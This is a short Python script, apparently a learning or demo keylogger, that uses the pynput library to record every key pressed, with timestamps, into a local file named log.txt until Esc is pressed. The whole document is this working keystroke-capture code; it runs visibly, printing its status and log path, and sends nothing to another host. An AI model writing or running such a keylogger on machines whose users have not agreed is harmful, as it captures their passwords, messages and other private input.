from pynput import keyboard
import logging
import os

# Define the log file name
LOG_FILE = "log.txt"

# 1. Setup Logging Configuration
# Configures logging to write to the specified file in append mode.
# The format includes the timestamp for better analysis.
logging.basicConfig(
    filename=LOG_FILE, 
    level=logging.DEBUG, 
    format='%(asctime)s: %(message)s'
)

# 2. Define the on_press function
def on_press(key):
    """
    Callback function executed when a key is pressed.
    Logs the key to the file.
    """
    try:
        # Check if the key is an alphanumeric character (has the .char attribute)
        # This handles regular letters, numbers, and symbols
        key_data = str(key.char)
    except AttributeError:
        # This handles special keys (e.g., Shift, Enter, Space)
        # We clean the string for better readability in the log file
        key_data = f'[{str(key).replace("Key.", "").upper()}]'
    
    # Write the key data to the log file
    logging.info(key_data)

# 3. Define the on_release function (Exit condition)
def on_release(key):
    """
    Callback function executed when a key is released.
    Used here to provide a clean exit mechanism.
    """
    if key == keyboard.Key.esc:
        # Stop listener when the 'Esc' key is pressed
        return False

# 4. Main Execution
if __name__ == "__main__":
    print(f"[*] Keylogger started. Logs are being written to: {os.path.abspath(LOG_FILE)}")
    print("[*] Press 'Esc' key to stop the keylogger and exit.")
    
    # Set up the listener with the defined callbacks
    # The 'with' statement ensures the listener is properly stopped.
    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join() # Blocks the main thread until the listener returns False (on_release with 'Esc')
    
    print("[*] Keylogger stopped.")